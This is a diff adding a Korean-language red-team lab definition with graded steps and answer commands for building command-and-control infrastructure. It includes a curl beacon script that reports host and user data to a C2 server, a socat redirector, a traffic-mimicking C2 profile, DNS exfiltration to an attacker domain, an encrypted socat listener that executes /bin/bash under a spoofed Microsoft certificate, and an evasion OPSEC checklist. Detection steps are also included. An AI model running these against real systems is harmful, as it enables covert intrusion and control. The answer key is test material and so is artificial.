@@ -1,0 +1,179 @@
+lab_id: "attack-adv-nonai-week07"
+title: "C2 인프라 구축과 운영"
+version: "non-ai"
+course: "attack-adv-nonai"
+week: 7
+description: "Command and Control(C2) 인프라의 설계, 구축, 운영을 실습한다. 다중 리다이렉터, 도메인 프론팅, 암호화 통신 등 탐지 회피를 위한 C2 인프라 기법을 다룬다."
+difficulty: "hard"
+duration_minutes: 120
+objectives:
+  - "C2 인프라의 아키텍처와 구성 요소를 이해한다"
+  - "리다이렉터, 도메인 프론팅 등 은닉 기법을 적용한다"
+  - "Malleable C2 프로파일의 원리를 이해한다"
+pass_threshold: 0.6
+steps:
+  - order: 1
+    instruction: "기본 C2 리스너를 구성하라. netcat을 사용하여 10.20.30.201의 포트 443에서 HTTPS 포트를 흉내내는 리스너를 설정하라(백그라운드)."
+    hint: "nc -lvnp 443으로 리스닝하고 &로 백그라운드 실행한다"
+    category: "exploit"
+    points: 10
+    answer: "nc -lvnp 4443 &>/tmp/c2_listener.log & echo \"C2 Listener PID: $!\" && sleep 1 && ss -tlnp | grep 4443"
+    answer_detail: "C2 리스너는 감염된 호스트(비콘)로부터의 콜백을 수신한다. 실전에서는 443(HTTPS)이나 80(HTTP) 포트를 사용하여 정상 트래픽으로 위장한다. Cobalt Strike, Sliver, Havoc 등의 C2 프레임워크는 GUI 기반으로 다중 리스너, 세션 관리, 포스트 익스플로잇을 지원한다."
+    verify:
+      type: "output_contains"
+      expect: "C2 Listener"
+      field: "stdout"
+  - order: 2
+    instruction: "C2 비콘을 시뮬레이션하라. curl을 사용하여 5초 간격으로 C2 서버에 체크인하는 비콘 스크립트를 /tmp/beacon.sh에 작성하라."
+    hint: "while 루프와 sleep으로 주기적 HTTP 요청을 보내는 스크립트를 작성한다"
+    category: "exploit"
+    points: 10
+    answer: "cat > /tmp/beacon.sh << 'SHEOF'\n#!/bin/bash\n# C2 Beacon Simulator - Educational Purpose Only\nC2_SERVER=\"http://10.20.30.201:4443\"\nSLEEP_TIME=5\nJITTER=2\n\nwhile true; do\n    HOSTNAME=$(hostname)\n    USER=$(whoami)\n    IP=$(hostname -I | awk '{print $1}')\n    CHECKIN=\"beacon=$HOSTNAME&user=$USER&ip=$IP&time=$(date +%s)\"\n    curl -s -o /dev/null \"$C2_SERVER/api/checkin?$CHECKIN\" 2>/dev/null\n    ACTUAL_SLEEP=$((SLEEP_TIME + RANDOM % JITTER))\n    sleep $ACTUAL_SLEEP\ndone\nSHEOF\nchmod +x /tmp/beacon.sh && cat /tmp/beacon.sh && echo '' && echo 'Beacon script created (not executed)'"
+    answer_detail: "C2 비콘은 주기적으로 C2 서버에 체크인하여 명령을 받아 실행한다. 지터(Jitter)는 체크인 간격에 무작위성을 추가하여 일정 패턴 기반 탐지를 회피한다. 실제 비콘은 프로세스 인젝션, 메모리 전용 실행, 암호화 통신 등으로 탐지를 어렵게 만든다."
+    verify:
+      type: "output_contains"
+      expect: "Beacon script"
+      field: "stdout"
+  - order: 3
+    instruction: "리다이렉터를 시뮬레이션하라. socat을 사용하여 로컬 포트 8443의 트래픽을 C2 서버(10.20.30.201:4443)로 포워딩하는 명령을 작성하라."
+    hint: "socat TCP-LISTEN:포트,fork TCP:대상:포트 형태로 포워딩한다"
+    category: "exploit"
+    points: 10
+    answer: "echo 'socat TCP-LISTEN:8443,reuseaddr,fork TCP:10.20.30.201:4443 &' && echo '' && echo '=== C2 Redirector Architecture ===' && echo 'Victim -> Redirector (8443) -> C2 Server (4443)' && echo '' && echo 'Benefits:' && echo '1. C2 server IP not exposed to victims' && echo '2. Multiple redirectors for redundancy' && echo '3. Quick burn and replace if detected' && echo '4. Geographic distribution for evasion'"
+    answer_detail: "리다이렉터는 비콘 트래픽을 실제 C2 서버로 중계하여 C2 서버의 IP를 숨긴다. 리다이렉터가 탐지되어 차단되면 새 리다이렉터로 교체하고 C2 서버는 유지한다. Apache mod_rewrite를 사용한 조건부 리다이렉션은 보안 연구원의 직접 접근을 차단하면서 비콘만 통과시킨다."
+    verify:
+      type: "output_contains"
+      expect: "C2 Redirector"
+      field: "stdout"
+  - order: 4
+    instruction: "도메인 프론팅(Domain Fronting) 기법의 원리를 분석하고 문서화하라. CDN을 통한 트래픽 은닉 과정을 설명하라."
+    hint: "SNI와 Host 헤더의 불일치를 활용하는 원리를 설명한다"
+    category: "analysis"
+    points: 10
+    answer: "echo -e '=== Domain Fronting ===\\n\\n[Principle]\\nTLS SNI: legitimate-cdn.com (seen by network monitor)\\nHTTP Host: c2.attacker.com (processed by CDN backend)\\n\\n[Flow]\\n1. Beacon connects to CDN IP (e.g., CloudFront)\\n2. TLS handshake shows SNI = trusted-domain.com\\n3. HTTP Host header = attacker-backend.com\\n4. CDN routes to attacker backend\\n5. Network monitor sees only CDN traffic\\n\\n[Detection]\\n- Compare SNI vs Host header (requires TLS inspection)\\n- Monitor for unusual CDN usage patterns\\n- DNS analytics for CDN CNAME chains\\n\\n[Status]\\n- Major CDNs (AWS, Azure, GCP) now block domain fronting\\n- Alternative: Domain borrowing, CDN tunneling still possible'"
+    answer_detail: "도메인 프론팅은 CDN의 라우팅 로직을 악용하여 트래픽의 실제 목적지를 숨긴다. TLS SNI에는 합법적 도메인을, HTTP Host 헤더에는 C2 도메인을 설정하면 네트워크 모니터에는 CDN 트래픽으로만 보인다. 주요 클라우드 제공업체가 이를 차단하였으나, 유사 변형 기법은 지속적으로 발전하고 있다."
+    verify:
+      type: "output_contains"
+      expect: "Domain Fronting"
+      field: "stdout"
+  - order: 5
+    instruction: "Malleable C2 프로파일의 개념을 이해하라. HTTP 요청/응답을 정상 웹 트래픽으로 위장하는 프로파일 예제를 /tmp/c2_profile.txt에 작성하라."
+    hint: "Cobalt Strike의 Malleable C2 프로파일 형식을 참고하여 HTTP 변환 규칙을 작성한다"
+    category: "exploit"
+    points: 10
+    answer: "cat > /tmp/c2_profile.txt << 'EOF'\n=== Malleable C2 Profile (Google Safe Browsing Mimicry) ===\n\nhttp-get {\n    set uri \"/safebrowsing/rd/CltOb12nLW1IbHehYhg\";\n    client {\n        header \"Accept\" \"text/html,*/*\";\n        header \"Accept-Language\" \"en-US\";\n        header \"Connection\" \"close\";\n        metadata {\n            base64url;\n            append \".class\";\n            parameter \"ct\";\n        }\n    }\n    server {\n        header \"Content-Type\" \"application/octet-stream\";\n        header \"Cache-Control\" \"public,max-age=172800\";\n        output {\n            prepend \"GIF89a\";\n            base64;\n            print;\n        }\n    }\n}\n\nhttp-post {\n    set uri \"/safebrowsing/report\";\n    client {\n        header \"Content-Type\" \"application/x-www-form-urlencoded\";\n        output {\n            base64;\n            parameter \"data\";\n        }\n    }\n}\n\n# Traffic appears as Google Safe Browsing API calls\n# Data hidden in parameters and GIF file responses\nEOF\ncat /tmp/c2_profile.txt"
+    answer_detail: "Malleable C2 프로파일은 C2 트래픽의 네트워크 시그니처를 커스터마이즈한다. HTTP 헤더, URI 패턴, 데이터 인코딩을 정상 서비스(Google API, Microsoft Update 등)와 동일하게 설정하면 네트워크 IDS/IPS의 시그니처 탐지를 회피할 수 있다. JA3/JA3S 핑거프린트도 고려해야 한다."
+    verify:
+      type: "output_contains"
+      expect: "Malleable C2 Profile"
+      field: "stdout"
+  - order: 6
+    instruction: "DNS 기반 C2 통신을 시뮬레이션하라. nslookup을 사용하여 인코딩된 데이터를 DNS TXT 쿼리로 전송하는 과정을 보여라."
+    hint: "DNS TXT 레코드 쿼리에 명령 결과를 인코딩하여 포함한다"
+    category: "exploit"
+    points: 10
+    answer: "CMD_RESULT=$(hostname | base64 | tr -d '=\\n') && echo \"=== DNS C2 Communication ===' && echo 'Encoded data: $CMD_RESULT\" && echo '' && echo 'Outbound (data exfil via subdomain):' && echo \"nslookup ${CMD_RESULT}.data.c2.attacker.com\" && echo '' && echo 'Inbound (command via TXT record):' && nslookup -type=TXT version.bind 2>&1 | head -5 && echo '' && echo 'Tools: dnscat2, iodine, dns2tcp, DNSTT'"
+    answer_detail: "DNS C2는 거의 모든 네트워크에서 허용되는 DNS 프로토콜을 악용한다. 명령은 TXT 레코드 응답에, 결과는 서브도메인 쿼리에 인코딩된다. 대역폭은 제한적이지만 은밀성이 매우 높다. 탐지를 위해서는 DNS 쿼리 길이, 빈도, 엔트로피를 분석해야 한다."
+    verify:
+      type: "output_contains"
+      expect: "DNS C2"
+      field: "stdout"
+  - order: 7
+    instruction: "C2 통신의 암호화를 구현하라. openssl을 사용하여 자체 서명 인증서를 생성하고, 암호화된 리스너를 설정하는 과정을 보여라."
+    hint: "openssl req -x509로 자체 서명 인증서를 생성하고, socat에서 SSL을 사용한다"
+    category: "exploit"
+    points: 10
+    answer: "openssl req -x509 -newkey rsa:2048 -keyout /tmp/c2_key.pem -out /tmp/c2_cert.pem -days 365 -nodes -subj '/CN=microsoft.com/O=Microsoft Corporation' 2>&1 | tail -3 && echo '' && echo '=== Encrypted C2 Listener ===' && echo 'socat OPENSSL-LISTEN:443,cert=/tmp/c2_cert.pem,key=/tmp/c2_key.pem,verify=0,fork EXEC:/bin/bash' && echo '' && echo 'Certificate mimics legitimate organization' && echo 'Traffic appears as normal HTTPS' && openssl x509 -in /tmp/c2_cert.pem -noout -subject -issuer 2>/dev/null"
+    answer_detail: "C2 통신의 TLS 암호화는 DPI(Deep Packet Inspection)를 방해한다. 자체 서명 인증서의 CN과 O 필드를 합법적 조직으로 설정하면 인증서 검사에서도 위장이 가능하다. 실전에서는 Let's Encrypt로 유효한 인증서를 발급받아 사용한다. JA3 핑거프린트는 TLS 클라이언트의 고유 패턴으로 탐지에 활용된다."
+    verify:
+      type: "output_contains"
+      expect: "Encrypted C2"
+      field: "stdout"
+  - order: 8
+    instruction: "C2 인프라의 OPSEC(Operational Security)을 분석하라. 안전한 C2 운영을 위한 체크리스트를 작성하라."
+    hint: "인프라 분리, 로그 관리, 인증서, DNS 등 각 측면의 OPSEC을 고려한다"
+    category: "analysis"
+    points: 10
+    answer: "echo -e '=== C2 OPSEC Checklist ===\\n\\n[Infrastructure]\\n- Separate staging/long-haul C2 servers\\n- Use cloud VPS (different providers)\\n- No link between C2 and personal identity\\n\\n[Network]\\n- Domain categorization (reputation)\\n- Aged domains (registered 6+ months ago)\\n- SSL certificates from legitimate CAs\\n- JA3 fingerprint matching common browsers\\n\\n[Communication]\\n- Sleep time > 60s for long-haul\\n- Jitter 20-50% for beacon randomization\\n- Kill date for expired campaigns\\n- Peer-to-peer for internal pivoting\\n\\n[Hosting]\\n- Pay with cryptocurrency\\n- Use VPN/Tor for management\\n- Separate attack infrastructure per engagement\\n\\n[Detection Evasion]\\n- Malleable C2 profiles mimicking legitimate traffic\\n- Rotate domains and IPs regularly\\n- Monitor for takedown notifications'"
+    answer_detail: "C2 OPSEC은 공격 인프라의 노출을 방지하는 운영 보안이다. 도메인은 최소 6개월 전에 등록하여 평판을 쌓고, 인프라는 참여(engagement)별로 분리하며, 관리 접근은 VPN/Tor를 통해 수행한다. 위협 인텔리전스 서비스가 인프라를 탐지할 수 있으므로 주기적 모니터링도 필요하다."
+    verify:
+      type: "output_contains"
+      expect: "OPSEC Checklist"
+      field: "stdout"
+  - order: 9
+    instruction: "SMB Named Pipe를 활용한 내부 C2 통신을 분석하라. 피봇팅에서 SMB 기반 P2P 통신의 장점을 설명하라."
+    hint: "SMB Named Pipe는 방화벽 내부에서 추가 포트 없이 통신할 수 있다"
+    category: "analysis"
+    points: 10
+    answer: "echo -e '=== SMB Named Pipe C2 ===\\n\\n[Concept]\\n- Uses SMB protocol (port 445) for C2 communication\\n- Named pipes: \\\\\\\\server\\\\pipe\\\\pipename\\n- Already allowed in most internal networks\\n\\n[Architecture]\\n  Internet C2 <-HTTPS-> Pivot Host <-SMB Pipe-> Internal Hosts\\n\\n[Advantages]\\n1. No new ports needed (445 already open internally)\\n2. Blends with normal AD/SMB traffic\\n3. No internet access needed for internal hosts\\n4. Encrypted within SMB signing\\n\\n[Cobalt Strike Implementation]\\n- Listener: windows/beacon_bind_pipe\\n- Connect: link targethost pipenamem\\n- P2P mesh: daisy-chain beacons\\n\\n[Detection]\\n- Monitor for unusual named pipe creation (Sysmon Event ID 17/18)\\n- Analyze SMB traffic patterns and pipe names'"
+    answer_detail: "SMB Named Pipe C2는 내부 네트워크에서 이미 허용된 SMB 프로토콜을 활용하여 추가적인 방화벽 규칙 변경 없이 통신한다. 인터넷 접근이 불가한 내부 호스트도 피봇 호스트를 통해 C2 명령을 수신할 수 있다. Sysmon의 파이프 생성/접근 이벤트(ID 17, 18)로 탐지할 수 있다."
+    verify:
+      type: "output_contains"
+      expect: "SMB Named Pipe"
+      field: "stdout"
+  - order: 10
+    instruction: "C2 프레임워크를 비교 분석하라. 주요 오픈소스 C2 프레임워크의 특징, 프로토콜, 탐지 난이도를 비교하라."
+    hint: "Cobalt Strike, Sliver, Havoc, Mythic 등의 주요 C2 프레임워크를 비교한다"
+    category: "analysis"
+    points: 10
+    answer: "echo -e '=== C2 Framework Comparison ===\\n\\nFramework     | Protocol          | OS      | Detection | License\\n------------- | ----------------- | ------- | --------- | --------\\nCobalt Strike | HTTP/S,DNS,SMB    | Win     | Medium    | Commercial\\nSliver        | HTTP/S,DNS,mTLS   | Multi   | Low       | Open Source\\nHavoc         | HTTP/S            | Win     | Low       | Open Source\\nMythic        | HTTP/S,WS,TCP     | Multi   | Medium    | Open Source\\nBrute Ratel   | HTTP/S,DNS,SMB    | Win     | Low       | Commercial\\nMerlin        | HTTP/2,HTTP/3     | Multi   | Low       | Open Source\\nPoshC2        | HTTP/S            | Multi   | Medium    | Open Source\\n\\nSelection Criteria:\\n- Target OS and architecture\\n- Required evasion level\\n- Team collaboration features\\n- OPSEC profile customization'"
+    answer_detail: "C2 프레임워크 선택은 대상 환경, 탐지 회피 수준, 팀 규모에 따라 달라진다. Cobalt Strike는 가장 성숙하지만 시그니처가 잘 알려져 있다. Sliver(BishopFox)와 Havoc은 최신 오픈소스로 탐지율이 낮다. Mythic은 플러그인 아키텍처로 확장성이 뛰어나다."
+    verify:
+      type: "output_contains"
+      expect: "C2 Framework Comparison"
+      field: "stdout"
+  - order: 11
+    instruction: "C2 비콘의 프로세스 인젝션 기법을 분석하라. 정상 프로세스에 코드를 주입하여 은닉하는 주요 기법을 정리하라."
+    hint: "CreateRemoteThread, Process Hollowing, APC Injection 등의 기법을 설명한다"
+    category: "exploit"
+    points: 10
+    answer: "echo -e '=== Process Injection Techniques ===\\n\\n[1] CreateRemoteThread\\n- Allocate memory in target process\\n- Write shellcode to allocated memory\\n- Create remote thread to execute\\n- Detection: Sysmon Event ID 8\\n\\n[2] Process Hollowing (RunPE)\\n- Create suspended process (e.g., svchost.exe)\\n- Unmap legitimate code\\n- Map malicious code at same base\\n- Resume execution\\n- Detection: Memory analysis, unmapped sections\\n\\n[3] APC Queue Injection\\n- Queue Asynchronous Procedure Call\\n- Executes when thread enters alertable state\\n- Less suspicious than CreateRemoteThread\\n\\n[4] DLL Injection\\n- LoadLibrary via remote thread\\n- DLL search order hijacking\\n- Reflective DLL injection (no disk touch)\\n\\n[5] Linux Equivalent\\n- ptrace attach + POKETEXT\\n- LD_PRELOAD injection\\n- /proc/pid/mem write'"
+    answer_detail: "프로세스 인젝션은 C2 비콘을 정상 프로세스(explorer.exe, svchost.exe 등)의 메모리 공간에서 실행하여 프로세스 기반 탐지를 회피한다. 각 기법마다 탐지 방법이 다르며, EDR은 API 호출 패턴(VirtualAllocEx→WriteProcessMemory→CreateRemoteThread)을 모니터링한다."
+    verify:
+      type: "output_contains"
+      expect: "Process Injection"
+      field: "stdout"
+  - order: 12
+    instruction: "C2 통신의 지터(Jitter)와 슬립 타임의 효과를 분석하라. 다양한 설정에서의 네트워크 패턴을 시뮬레이션하라."
+    hint: "sleep 시간에 랜덤 값을 추가하여 주기적 패턴을 깨뜨린다"
+    category: "analysis"
+    points: 10
+    answer: "echo '=== Beacon Timing Analysis ===' && for i in $(seq 1 10); do BASE=60; JITTER=$((RANDOM % 30)); ACTUAL=$((BASE + JITTER)); echo \"Beacon $i: sleep ${ACTUAL}s (base:${BASE} + jitter:${JITTER})\"; done && echo '' && echo 'Without jitter: 60,60,60,60,60 -> easily detected periodic pattern' && echo 'With 50% jitter: 63,47,72,55,68 -> irregular, harder to detect' && echo '' && echo 'Recommended settings:' && echo 'Short-haul (staging): 1-5s sleep, 0% jitter' && echo 'Long-haul (persistent): 300-3600s sleep, 30-50% jitter'"
+    answer_detail: "비콘의 체크인 패턴이 일정하면 네트워크 행위 분석(NBA)으로 쉽게 탐지된다. 지터(Jitter)는 슬립 타임에 무작위성을 추가하여 주기적 패턴을 깨뜨린다. 장기 지속(long-haul) C2는 5-60분 간격에 30-50% 지터를 설정하여 정상 브라우저 트래픽과 유사하게 만든다."
+    verify:
+      type: "output_contains"
+      expect: "Beacon Timing"
+      field: "stdout"
+  - order: 13
+    instruction: "C2 탐지 기법을 방어자 관점에서 분석하라. JA3/JA3S 핑거프린팅, 비콘 탐지, 네트워크 이상행위 분석 기법을 정리하라."
+    hint: "네트워크, 호스트, 행위 기반 탐지 방법을 분류하여 설명한다"
+    category: "defense"
+    points: 10
+    answer: "echo -e '=== C2 Detection Techniques ===\\n\\n[Network-Based]\\n1. JA3/JA3S TLS Fingerprinting\\n   - Hash of TLS ClientHello/ServerHello parameters\\n   - Cobalt Strike default JA3: well-known signature\\n2. Beacon Detection\\n   - Rita/AC-Hunter: Periodic communication analysis\\n   - Frequency analysis of connection intervals\\n3. DNS Analytics\\n   - Long subdomain queries (DNS tunneling)\\n   - High entropy in DNS labels\\n   - Unusual TXT record volume\\n\\n[Host-Based]\\n4. Memory Scanning\\n   - Beacon signatures in process memory\\n   - Unbacked executable memory regions\\n5. Named Pipe Monitoring\\n   - Sysmon Event 17/18 for pipe creation\\n6. Process Injection Detection\\n   - Cross-process API calls (Sysmon Event 8/10)\\n\\n[Behavioral]\\n7. UEBA (User Entity Behavior Analytics)\\n   - Unusual process network activity\\n   - Abnormal working hours activity'"
+    answer_detail: "C2 탐지는 네트워크, 호스트, 행위의 3계층에서 이루어진다. JA3 핑거프린팅은 TLS 핸드셰이크의 고유 패턴을 식별하고, RITA(Real Intelligence Threat Analytics)는 비콘의 주기적 통신을 탐지한다. 메모리 스캔은 프로세스 인젝션된 페이로드를 발견할 수 있다."
+    verify:
+      type: "output_contains"
+      expect: "C2 Detection"
+      field: "stdout"
+  - order: 14
+    instruction: "C2 인프라를 정리하라. 실습에서 생성한 리스너 프로세스를 종료하고, 임시 파일을 삭제하라."
+    hint: "kill 명령으로 프로세스를 종료하고, rm으로 파일을 삭제한다"
+    category: "analysis"
+    points: 10
+    answer: "pkill -f 'nc -lvnp 4443' 2>/dev/null && echo 'Listener terminated' && rm -f /tmp/c2_*.pem /tmp/beacon.sh /tmp/c2_profile.txt /tmp/c2_listener.log && echo 'Temp files cleaned' && echo '' && echo '=== C2 Teardown Complete ===' && ss -tlnp | grep 4443 || echo 'Port 4443 released'"
+    answer_detail: "C2 인프라의 정리(Teardown)는 레드팀 운영의 필수 단계이다. 리스너 종료, 임시 파일 삭제, 방화벽 규칙 복원, 리다이렉터 해제 등을 포함한다. 참여(engagement) 종료 후 모든 인프라를 해체하고, 잔존 아티팩트가 없는지 확인해야 한다."
+    verify:
+      type: "output_contains"
+      expect: "C2 Teardown"
+      field: "stdout"
+  - order: 15
+    instruction: "C2 인프라 실습을 종합하여 공격자/방어자 관점의 핵심 교훈을 /tmp/c2_report.txt에 작성하라."
+    hint: "C2 인프라의 설계 원칙과 탐지/방어 전략을 균형 있게 정리한다"
+    category: "analysis"
+    points: 10
+    answer: "cat > /tmp/c2_report.txt << 'EOF'\n=== C2 Infrastructure Lab Report ===\n\n[Key Takeaways - Attacker]\n1. Layered infrastructure: Redirector -> C2 -> Staging\n2. Encryption + Malleable profiles for evasion\n3. DNS C2 for highly restricted environments\n4. OPSEC discipline throughout the engagement\n5. Kill switches and auto-cleanup mechanisms\n\n[Key Takeaways - Defender]\n1. JA3/JA3S fingerprinting for TLS anomalies\n2. Beacon detection with RITA/network flow analysis\n3. DNS query entropy and length monitoring\n4. Process injection detection with Sysmon/EDR\n5. Egress filtering: whitelist allowed domains\n\n[Metrics]\n- C2 channels simulated: HTTP, DNS, SMB\n- Evasion techniques covered: 8\n- Detection methods analyzed: 7\n- MITRE ATT&CK techniques: T1071, T1572, T1573, T1090\nEOF\ncat /tmp/c2_report.txt"
+    answer_detail: "C2 인프라는 현대 사이버 공격의 핵심 요소이다. 공격자는 은닉과 탄력성을, 방어자는 탐지와 차단을 목표로 지속적으로 경쟁한다. 다층 네트워크 모니터링(IDS + NBA + TLS 검사), 엔드포인트 보호(EDR + 메모리 스캔), 행위 분석(UEBA)의 조합이 효과적인 방어이다."
+    verify:
+      type: "output_contains"
+      expect: "C2 Infrastructure Lab Report"
+      field: "stdout"
